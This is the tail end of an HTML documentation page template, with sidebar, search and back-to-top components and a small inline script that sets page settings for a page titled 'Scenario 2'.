                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "Scenario 2", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
